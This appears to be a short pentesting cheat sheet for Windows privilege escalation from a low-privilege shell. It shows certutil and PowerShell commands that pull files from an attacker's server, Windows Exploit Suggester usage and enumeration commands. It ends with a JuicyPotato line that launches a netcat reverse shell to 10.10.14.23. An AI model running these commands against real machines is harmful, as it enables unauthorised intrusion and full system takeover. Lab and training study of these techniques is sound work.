This post's content is about when you get a low, unprivileged shell on a Windows Machine.
First and foremost thing is to upload files on the system.
### Steps:
    Start server on attacker machine:
    >python3 -m http.server 80 #on attacker machine
    On victim machine:
    1)Using certutil.exe
    >certutil.exe -urlcache -split -f http://<ip><port>/path/to/file
    2)Using powershell
    >powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')

Easy way to check for privilege escalation vulnerabilties is to use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) 
Steps to use Windows-Exploit-Suggester
### Steps:
    On attacker machine:
    Install xlrd python library.
    >python windows-exploit-suggester.py -update #this will create a .xls file which will contain all ms cve's   
    On victim MS machine, run systeminfo to fetch system information, and save it locally on attacking machine as sys.txt.
    Then on attacking machine use
    >python windows-exploit-suggester.py --database file.xls --systeminfo sys.txt
    It will list all the vulnerabilties. 
    Note: [E] means Exploitdb, [M] means metasploitable

Privilege exploitation
### Post Exploitation Enumeration
    >whoami /priv ->lists privileges current user has
    >schtasks /query /fo LIST /v
    >netsh advfirewall firewall show rule name=all
    >netstat -ano
    >tasklist /SVC
    >wmic qfe get Caption, Description, HotFixID, InstalledOn
    >wmic product get name, version, vendor
    >accesschk.exe -uws "Everyone" "C:\Program Files"
    
### Some privileges if enables to exploit
    1) SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
       If this is Enabled then you are the SYSTEM.
       List of CLDIS-> https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
       juicypotato.exe -l 1234 -p nc.exe -a "-e cmd.exe 10.10.14.23 443" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820} #Enter CLDIS
